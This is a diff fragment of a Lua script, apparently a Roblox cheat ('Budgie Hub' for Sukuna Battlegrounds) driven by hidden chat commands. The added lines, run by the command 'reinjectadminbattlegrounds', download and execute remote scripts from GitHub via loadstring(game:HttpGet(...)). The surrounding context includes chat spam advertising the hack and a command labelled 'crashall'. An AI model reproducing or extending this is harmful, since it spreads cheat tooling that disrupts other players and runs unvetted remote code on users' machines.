@@ -17,6 +17,13 @@ function onChatMessage(player, message)
             "I'm using Budgie Hub | Best hack/script for Sukuna Battlegrounds",
             "All"
         )
+   elseif message:lower() == "reinjectadminbattlegrounds" then
+      local OrionLib = loadstring(game:HttpGet(("https://raw.githubusercontent.com/shlexware/Orion/main/source")))()
+      OrionLib:Destroy()
+      wait(1)
+      loadstring(game:HttpGet("https://raw.githubusercontent.com/ADSKerOffical/SukunaBattlegrounds/main/Battlegrounds"))(
+
+      )
     elseif message:lower() == "findtonotbadadminbattlegrounds" then
         game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents.SayMessageRequest:FireServer(",//./.", "All")
     elseif message:lower() == "crashalladminbattlegrounds" then
